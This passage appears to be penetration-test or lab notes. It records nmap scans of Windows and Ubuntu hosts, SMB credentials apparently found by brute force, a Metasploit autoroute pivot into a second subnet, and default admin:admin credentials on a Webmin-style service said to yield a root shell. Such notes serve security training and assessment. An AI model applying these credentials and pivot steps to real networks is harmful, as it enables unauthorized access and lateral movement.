|   NetBIOS computer name: WINSERVER-03\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2023-07-15T16:36:39+00:00
| smb2-time: 
|   date: 2023-07-15T16:36:39
|_  start_date: N/A
|_nbstat: NetBIOS name: WINSERVER-03, NetBIOS user: <unknown>, NetBIOS MAC: 06:a0:b1:9b:ad:e3 (unknown)
```

#### SMB
Credentials:
`[445][smb] host: 192.168.100.55   login: Administrator   password: swordfish`
`[445][smb] host: 192.168.100.55   login: lawrence   password: computadora`
+ Connecting reveals that it is connected to an internal network: 192.168.0.0/24, with it being 192.168.0.50

## Machine - 192.168.100.63
Hostname: ip-192-168-100-63.us-west-1.compute.internal, WIN-QUCP54CMJ5O
OS: Windows 

### Services 
``` Shell
PORT      STATE SERVICE            VERSION
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3389/tcp  open  ssl/ms-wbt-server?
| ssl-cert: Subject: commonName=WIN-QUCP54CMJ5O
| Not valid before: 2023-07-14T15:40:56
|_Not valid after:  2024-01-13T15:40:56
| rdp-ntlm-info: 
|   Target_Name: WIN-QUCP54CMJ5O
|   NetBIOS_Domain_Name: WIN-QUCP54CMJ5O
|   NetBIOS_Computer_Name: WIN-QUCP54CMJ5O
|   DNS_Domain_Name: WIN-QUCP54CMJ5O
|   DNS_Computer_Name: WIN-QUCP54CMJ5O
|   Product_Version: 6.3.9600
|_  System_Time: 2023-07-15T16:36:39+00:00
|_ssl-date: 2023-07-15T16:37:19+00:00; 0s from scanner time.
49155/tcp open  msrpc              Microsoft Windows RPC
49158/tcp open  msrpc              Microsoft Windows RPC
MAC Address: 06:29:BD:76:1D:D7 (Unknown)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2012|2008|7|Vista (91%)
OS CPE: cpe:/o:microsoft:windows_server_2012 cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows_7::-:professional cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1
Aggressive OS guesses: Microsoft Windows Server 2012 (91%), Microsoft Windows Server 2012 or Windows Server 2012 R2 (91%), Microsoft Windows Server 2012 R2 (91%), Microsoft Windows Server 2008 R2 (85%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (85%), Microsoft Windows 7 Professional or Windows 8 (85%), Microsoft Windows 7 SP1 or Windows Server 2008 SP2 or 2008 R2 SP1 (85%), Microsoft Windows Vista SP0 or SP1, Windows Server 2008 SP1, or Windows 7 (85%), Microsoft Windows 7 Professional (85%), Microsoft Windows Vista SP2 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
```

### Scripts 
``` Shell
Host script results:
| smb2-time: 
|   date: 2023-07-15T16:36:39
|_  start_date: 2023-07-15T16:23:33
|_nbstat: NetBIOS name: WIN-QUCP54CMJ5O, NetBIOS user: <unknown>, NetBIOS MAC: 06:29:bd:76:1d:d7 (unknown)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   3.0.2: 
|_    Message signing enabled but not required
```

## Machine - 192.168.100.67
Hostname: ip-192-168-100-67.us-west-1.compute.internal
OS: Linux Ubuntu 

### Services
``` Shell
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 2a:4e:5f:87:18:c5:9b:a0:3c:02:38:1b:25:e9:be:40 (RSA)
|   256 af:4a:71:6b:05:71:66:28:7f:7f:9d:3d:2b:90:12:71 (ECDSA)
|_  256 1e:03:76:31:0c:3d:a4:3b:6d:4a:88:f1:de:4c:d4:be (ED25519)
MAC Address: 06:B5:EF:1D:58:43 (Unknown)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=7/15%OT=22%CT=1%CU=34865%PV=Y%DS=1%DC=D%G=Y%M=06B5EF%T
OS:M=64B2CB3F%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10C%TI=Z%CI=Z%II=I
OS:%TS=A)OPS(O1=M2301ST11NW6%O2=M2301ST11NW6%O3=M2301NNT11NW6%O4=M2301ST11N
OS:W6%O5=M2301ST11NW6%O6=M2301ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F
OS:4B3%W6=F4B3)ECN(R=Y%DF=Y%T=40%W=F507%O=M2301NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T
OS:=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R
OS:%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=
OS:40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0
OS:%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R
OS:=Y%DFI=N%T=40%CD=S)

Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

# Network 2
Subnet: 192.168.0.0/24

Connected via 192.168.100.55 on Network 1, which is 192.168.0.50 on Network 2
+ Added route via: `run autoroute -s 192.168.0.50/24`
+ Did a port scan on that subnet:
``` Shell
[+] 192.168.0.2:          - 192.168.0.2:53 - TCP OPEN
[*] 192.168.0.0/24:       - Scanned  26 of 256 hosts (10% complete)
[+] 192.168.0.51:         - 192.168.0.51:22 - TCP OPEN
[+] 192.168.0.57:         - 192.168.0.57:22 - TCP OPEN
[+] 192.168.0.50:         - 192.168.0.50:80 - TCP OPEN
[+] 192.168.0.51:         - 192.168.0.51:80 - TCP OPEN
[+] 192.168.0.50:         - 192.168.0.50:135 - TCP OPEN
[+] 192.168.0.50:         - 192.168.0.50:139 - TCP OPEN
[+] 192.168.0.50:         - 192.168.0.50:445 - TCP OPEN
[+] 192.168.0.61:         - 192.168.0.61:139 - TCP OPEN
[+] 192.168.0.61:         - 192.168.0.61:135 - TCP OPEN
[+] 192.168.0.61:         - 192.168.0.61:445 - TCP OPEN
[*] 192.168.0.0/24:       - Scanned  54 of 256 hosts (21% complete)
[*] 192.168.0.0/24:       - Scanned  77 of 256 hosts (30% complete)
[*] 192.168.0.0/24:       - Scanned 104 of 256 hosts (40% complete)
[*] 192.168.0.0/24:       - Scanned 130 of 256 hosts (50% complete)
[*] 192.168.0.0/24:       - Scanned 154 of 256 hosts (60% complete)
[*] 192.168.0.0/24:       - Scanned 180 of 256 hosts (70% complete)
[*] 192.168.0.0/24:       - Scanned 207 of 256 hosts (80% complete)
[*] 192.168.0.0/24:       - Scanned 231 of 256 hosts (90% complete)
[*] 192.168.0.0/24:       - Scanned 256 of 256 hosts (100% complete)
[*] Auxiliary module execution completed

```

## Machine - 192.168.0.2

### Services 
192.168.0.2:53 - TCP OPEN

## Pivot Machine - 192.168.0.50

### Services 
192.168.0.50:80 - TCP OPEN
192.168.0.50:135 - TCP OPEN
192.168.0.50:139 - TCP OPEN
192.168.0.50:445 - TCP OPEN

## Machine - 192.168.0.51

### Services
192.168.0.51:22 - TCP OPEN
+ netcat banner grab: `SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.3` 
92.168.0.51:80 - TCP OPEN
192.168.0.51:3389 - TCP OPEN
192.168.0.51:10000 - TCP OPEN
+ netcat banner grab: `HTTP/1.0 400 Bad Request`
```
Server: MiniServ/1.920
Date: Sun, 16 Jul 2023 18:27:33 GMT
Content-type: text/html; Charset=iso-8859-1
Connection: close
```
+ RDP into 192.168.100.55 and browsing to the website and port, can use the default credentials admin:admin to get a root shell


## Machine - 192.168.0.57

### Services 
192.168.0.57:22 - TCP OPEN

## Machine - 192.168.0.61

### Services 
192.168.0.61:135 - TCP OPEN
192.168.0.61:139 - TCP OPEN
192.168.0.61:445 - TCP OPEN
192.168.0.61:3389 - TCP OPEN
192.168.0.61:5985 - TCP OPEN
